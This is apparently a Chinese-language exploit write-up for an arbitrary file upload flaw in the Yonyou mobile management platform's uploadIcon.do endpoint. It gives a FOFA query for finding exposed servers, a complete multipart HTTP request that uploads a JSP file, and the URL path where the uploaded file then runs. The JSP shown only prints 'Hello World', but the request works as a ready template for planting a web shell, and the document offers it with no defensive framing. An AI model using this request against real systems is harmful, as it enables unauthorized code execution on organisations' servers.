## 用友移动管理平台uploadIcon任意文件上传漏洞

## fofa
```
app="用友-移动系统管理"
```

## poc
```
POST /maportal/appmanager/uploadIcon.do HTTP/2
Host: 
Pragma: no-cache
Cache-Control: no-cache
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "macOS"
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryh1ZETbVA73oQbnyE
Content-Length: 193

------WebKitFormBoundaryh1ZETbVA73oQbnyE
Content-Disposition: form-data; name="iconFile";filename="123.jsp"

<%
out.println("Hello World");
%>
------WebKitFormBoundaryh1ZETbVA73oQbnyE--
```

## 文件路径
http://ip/maupload/img/123.jsp

